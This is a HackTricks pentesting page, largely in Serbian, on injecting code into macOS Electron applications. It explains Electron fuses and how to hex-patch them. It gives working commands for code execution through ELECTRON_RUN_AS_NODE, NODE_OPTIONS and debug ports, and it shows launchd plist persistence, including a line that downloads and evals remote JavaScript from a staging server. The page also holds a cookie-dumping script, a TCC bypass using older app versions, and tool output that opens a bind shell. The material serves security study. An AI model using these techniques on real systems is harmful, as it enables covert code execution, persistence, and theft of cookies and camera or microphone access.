# macOS Electron Applications Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

Ako ne znate šta je Electron, možete pronaći [**puno informacija ovde**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps). Ali za sada, samo znajte da Electron pokreće **node**.\
I node ima neke **parametre** i **env varijable** koje se mogu koristiti da **izvrše drugi kod** osim naznačenog fajla.

### Electron Fuses

Ove tehnike će biti razmatrane u nastavku, ali u poslednje vreme Electron je dodao nekoliko **bezbednosnih zastavica da ih spreči**. Ovo su [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses) i ovo su one koje se koriste da **spreče** Electron aplikacije na macOS-u da **učitavaju proizvoljni kod**:

* **`RunAsNode`**: Ako je onemogućen, sprečava korišćenje env varijable **`ELECTRON_RUN_AS_NODE`** za injekciju koda.
* **`EnableNodeCliInspectArguments`**: Ako je onemogućen, parametri kao što su `--inspect`, `--inspect-brk` neće biti poštovani. Izbegavajući ovaj način za injekciju koda.
* **`EnableEmbeddedAsarIntegrityValidation`**: Ako je omogućen, učitani **`asar`** **fajl** će biti **validiran** od strane macOS-a. **Sprečavajući** na ovaj način **injekciju koda** modifikovanjem sadržaja ovog fajla.
* **`OnlyLoadAppFromAsar`**: Ako je ovo omogućeno, umesto da traži učitavanje u sledećem redosledu: **`app.asar`**, **`app`** i konačno **`default_app.asar`**. Proveravaće samo i koristiti app.asar, čime se osigurava da kada se **kombinuje** sa **`embeddedAsarIntegrityValidation`** fuzom, postaje **nemoguće** **učitati nevalidirani kod**.
* **`LoadBrowserProcessSpecificV8Snapshot`**: Ako je omogućen, proces pretraživača koristi fajl pod nazivom `browser_v8_context_snapshot.bin` za svoj V8 snapshot.

Još jedna zanimljiva fuzija koja neće sprečiti injekciju koda je:

* **EnableCookieEncryption**: Ako je omogućen, skladište kolačića na disku je enkriptovano koristeći kriptografske ključeve na nivou operativnog sistema.

### Checking Electron Fuses

Možete **proveriti ove zastavice** iz aplikacije sa:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Modifying Electron Fuses

As the [**docs mention**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), konfiguracija **Electron Fuses** je podešena unutar **Electron binarnog fajla** koji negde sadrži string **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.

U macOS aplikacijama ovo je obično u `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Možete učitati ovu datoteku u [https://hexed.it/](https://hexed.it/) i pretražiti prethodni niz. Nakon ovog niza možete videti u ASCII brojeve "0" ili "1" koji označavaju da li je svaki osigurač onemogućen ili omogućen. Samo modifikujte heksadecimalni kod (`0x30` je `0` i `0x31` je `1`) da **modifikujete vrednosti osigurača**.

<figure><img src="../../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

Imajte na umu da ako pokušate da **prepišete** **`Electron Framework`** binarnu datoteku unutar aplikacije sa ovim izmenjenim bajtovima, aplikacija neće raditi.

## RCE dodavanje koda u Electron aplikacije

Mogu postojati **spoljni JS/HTML fajlovi** koje koristi Electron aplikacija, tako da napadač može ubrizgati kod u ove fajlove čija se potpisivanje neće proveravati i izvršiti proizvoljan kod u kontekstu aplikacije.

{% hint style="danger" %}
Međutim, u ovom trenutku postoje 2 ograničenja:

* Dozvola **`kTCCServiceSystemPolicyAppBundles`** je **potrebna** za modifikaciju aplikacije, tako da to po defaultu više nije moguće.
* Kompajlirana **`asap`** datoteka obično ima osigurače **`embeddedAsarIntegrityValidation`** `i` **`onlyLoadAppFromAsar`** `omogućene`

Što čini ovaj put napada složenijim (ili nemogućim).
{% endhint %}

Imajte na umu da je moguće zaobići zahtev za **`kTCCServiceSystemPolicyAppBundles`** kopiranjem aplikacije u drugi direktorijum (kao što je **`/tmp`**), preimenovanjem foldera **`app.app/Contents`** u **`app.app/NotCon`**, **modifikovanjem** **asar** datoteke sa vašim **zloćudnim** kodom, preimenovanjem nazad u **`app.app/Contents`** i izvršavanjem.

Možete raspakovati kod iz asar datoteke sa:
```bash
npx asar extract app.asar app-decomp
```
I spakujte ga nazad nakon što ste ga izmenili sa:
```bash
npx asar pack app-decomp app-new.asar
```
## RCE sa `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>

Prema [**dokumentaciji**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node), ako je ova env varijabla postavljena, pokrenuće proces kao normalan Node.js proces.

{% code overflow="wrap" %}
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Ako je osigurač **`RunAsNode`** onemogućen, env varijabla **`ELECTRON_RUN_AS_NODE`** će biti ignorisana, i ovo neće raditi.
{% endhint %}

### Injekcija iz App Plist

Kao [**predloženo ovde**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), mogli biste zloupotrebiti ovu env varijablu u plist-u da održite postojanost:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE sa `NODE_OPTIONS`

Možete sačuvati payload u drugoj datoteci i izvršiti ga:

{% code overflow="wrap" %}
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
{% endcode %}

{% hint style="danger" %}
Ako je osigurač **`EnableNodeOptionsEnvironmentVariable`** **onemogućen**, aplikacija će **zanemariti** env var **NODE\_OPTIONS** kada se pokrene, osim ako env var **`ELECTRON_RUN_AS_NODE`** nije postavljen, koji će takođe biti **zanemaren** ako je osigurač **`RunAsNode`** onemogućen.

Ako ne postavite **`ELECTRON_RUN_AS_NODE`**, naići ćete na **grešku**: `Većina NODE_OPTIONs nije podržana u pakovanim aplikacijama. Pogledajte dokumentaciju za više detalja.`
{% endhint %}

### Injekcija iz App Plist

Možete zloupotrebiti ovu env var u plist-u da održite postojanost dodavanjem ovih ključeva:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE sa inspekcijom

Prema [**ovome**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), ako izvršite Electron aplikaciju sa zastavicama kao što su **`--inspect`**, **`--inspect-brk`** i **`--remote-debugging-port`**, **debug port će biti otvoren** tako da se možete povezati na njega (na primer iz Chrome-a u `chrome://inspect`) i moći ćete da **ubacite kod na njega** ili čak pokrenete nove procese.\
Na primer:
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Ako je osigurač **`EnableNodeCliInspectArguments`** onemogućen, aplikacija će **zanemariti node parametre** (kao što je `--inspect`) prilikom pokretanja, osim ako je env varijabla **`ELECTRON_RUN_AS_NODE`** postavljena, koja će takođe biti **zanemarena** ako je osigurač **`RunAsNode`** onemogućen.

Međutim, i dalje možete koristiti **electron param `--remote-debugging-port=9229`**, ali prethodni payload neće raditi za izvršavanje drugih procesa.
{% endhint %}

Korišćenjem parametra **`--remote-debugging-port=9222`** moguće je ukrasti neke informacije iz Electron aplikacije kao što su **istorija** (sa GET komandama) ili **kolačići** pretraživača (pošto su **dekriptovani** unutar pretraživača i postoji **json endpoint** koji će ih dati).

Možete naučiti kako to da uradite [**ovde**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) i [**ovde**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) i koristiti automatski alat [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) ili jednostavan skript kao:
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
U [**ovoj blog objavi**](https://hackerone.com/reports/1274695), ovo debagovanje se zloupotrebljava da se headless chrome **preuzme proizvoljne datoteke na proizvoljnim lokacijama**.

### Injekcija iz App Plist

Možete zloupotrebiti ovu env promenljivu u plist-u da održite postojanost dodavanjem ovih ključeva:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## TCC Bypass abusing Older Versions

{% hint style="success" %}
TCC daemon iz macOS-a ne proverava verziju aplikacije koja se izvršava. Dakle, ako **ne možete da injektujete kod u Electron aplikaciju** sa bilo kojom od prethodnih tehnika, možete preuzeti prethodnu verziju APP-a i injektovati kod u nju jer će i dalje dobiti TCC privilegije (osim ako Trust Cache to ne spreči).
{% endhint %}

## Run non JS Code

Prethodne tehnike će vam omogućiti da izvršavate **JS kod unutar procesa Electron aplikacije**. Međutim, zapamtite da **dečiji procesi rade pod istim sandbox profilom** kao roditeljska aplikacija i **nasleđuju njihove TCC dozvole**.\
Stoga, ako želite da zloupotrebite privilegije za pristup kameri ili mikrofonu, na primer, možete jednostavno **izvršiti drugi binarni fajl iz procesa**.

## Automatic Injection

Alat [**electroniz3r**](https://github.com/r3ggi/electroniz3r) se može lako koristiti za **pronalazak ranjivih Electron aplikacija** koje su instalirane i injektovanje koda u njih. Ovaj alat će pokušati da koristi **`--inspect`** tehniku:

Morate ga sami kompajlirati i možete ga koristiti ovako:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
## Reference

* [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
* [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
* [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

{% hint style="success" %}
Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
